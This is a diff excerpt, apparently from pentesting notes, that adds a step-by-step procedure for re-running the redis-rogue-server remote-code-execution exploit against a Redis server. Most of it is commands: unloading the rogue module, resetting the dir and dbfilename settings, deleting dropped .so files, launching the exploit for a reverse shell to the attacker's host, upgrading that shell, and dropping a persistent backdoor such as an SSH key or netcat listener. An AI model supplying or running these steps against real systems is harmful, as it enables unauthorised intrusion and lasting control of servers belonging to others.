@@ -1795,5 +1795,100 @@ add the following
     #include <arpa/inet.h>  // For inet_addr
 
 or use alternat payload: https://github.com/Ridter/redis-rce
+ step-by-step cleanup-and-retry procedure for the redis-rogue-server exploit so you can re-run it reliably without getting stuck in the “taking too long” state.
 
+Step 1 – Connect to Redis
+From your attacking box:
+
+bash
+
+redis-cli -h <target_ip> -p 6379
+(If the Redis server uses a password, add -a <password>.)
+
+Step 2 – Check for loaded modules
+redis
+
+MODULE LIST
+Look for something like:
+
+arduino
+
+1) 1) "name"
+   2) "system"
+   3) "ver"
+   4) "1.0"
+If "system" (or your rogue module name) is there, unload it:
+
+redis
+
+MODULE UNLOAD system
+Step 3 – Reset modified config
+The exploit usually changes:
+
+dir (where the module is saved)
+
+dbfilename (filename of module file)
+
+Check them:
+
+r
+
+CONFIG GET dir
+CONFIG GET dbfilename
+Reset to defaults (often /var/lib/redis and dump.rdb):
+
+redis
+
+CONFIG SET dir /var/lib/redis
+CONFIG SET dbfilename dump.rdb
+Step 4 – Remove leftover module files
+If you still have shell access (via reverse shell or RCE), delete the .so file the exploit uploaded.
+Common paths:
+
+bash
+
+rm -f /var/lib/redis/*.so
+rm -f /tmp/*.so
+(Paths depend on where the exploit dropped the file — check CONFIG GET dir if unsure.)
+
+Step 5 – Restart Redis (if possible)
+If you control the machine or have root:
+
+bash
+
+systemctl restart redis
+If not, at least ensure the rogue module is unloaded (Step 2) and config is reset (Step 3).
+
+Step 6 – Kill stuck rogue-server process on your machine
+Sometimes your local rogue-server process is still running and blocking the port:
+
+bash
+
+ps aux | grep redis-rogue-server
+kill -9 <PID>
+Step 7 – Re-run the exploit cleanly
+Start fresh:
+
+bash
+
+./redis-rogue-server.py --rhost <target_ip> --lhost <your_ip> --lport 4443
+When prompted, pick reverse shell instead of interactive — it’s more stable.
+
+Once you get the shell, immediately:
+
+Upgrade it to a full TTY:
+
+bash
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo; fg
+Drop a persistent backdoor (SSH key, netcat listener, etc.).
+
+Step 8 – Verify before retrying in the future
+If it fails in the future, check:
+
+bash
+
+redis-cli -h <target_ip> MODULE LIST
+If system is present → unload & reset config before retrying.
 </details>
